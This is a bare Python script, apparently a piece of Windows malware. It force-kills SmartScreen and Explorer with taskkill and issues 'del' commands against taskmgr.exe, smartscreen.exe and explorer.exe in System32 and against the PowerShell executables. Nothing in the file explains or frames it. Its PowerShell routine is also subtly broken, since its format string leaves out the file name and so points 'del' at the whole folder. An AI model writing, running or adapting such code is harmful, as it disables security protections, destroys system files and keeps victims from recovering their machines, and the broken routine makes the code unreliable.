#!/usr/bin/python
#coding:utf-8
import os, sys

# ENVIRONMENT VARIABLE
letter_drive_path = os.environ["SystemDrive"]
current_user      = os.environ["USERNAME"]

class Kill():
    """ Class that allows to kill processes """
    def __init__(self):
        self.f = "/F"
        self.k1 = "START /MIN taskkill /IM"
    # FUNCTION TO KILL SMARTSCREEN (Windows10)
    def smart(self):
        try:
            killed = "{} smartscreen.exe {}".format(self.k1, self.f)
            os.system(killed)
        except Exception:
            killed = 0
        return killed
    # FUNCTION TO KILL EXPLORER.EXE
    def exp(self):
        try:
            killed = "{} explorer.exe {}".format(self.k1, self.f)
            os.system(killed)
        except Exception:
            killed = 0
        return killed

class Remove():
    """ Class that allows to delete processes """
    def __init__(self):
        self.ex = "del"
        self.r1 = "{}\\Windows\\System32\\".format(letter_drive_path)
    # Function to delete process in the directory specified
    def stsk(self):
        procs = ['taskmgr.exe', 'smartscreen.exe']
        for proc in procs:
            ex = "{} {}{}".format(self.ex, self.r1, proc)
            os.system(ex)
    # Function to delete gui process on windows
    def exp(self):
        cmd = "{} \\windows\\explorer.exe ".format(self.ex)
        os.system(cmd)
    # Function to delete the powershell
    def power(self):
        pwr_sh = ['powershell.exe', 'powershell_ise.exe']
        for proc in pwr_sh:
            cmd = "{} \\windows\\system32\\WindowsPowerShell\\v1.0\\".format(self.ex, proc)
            os.system(cmd)
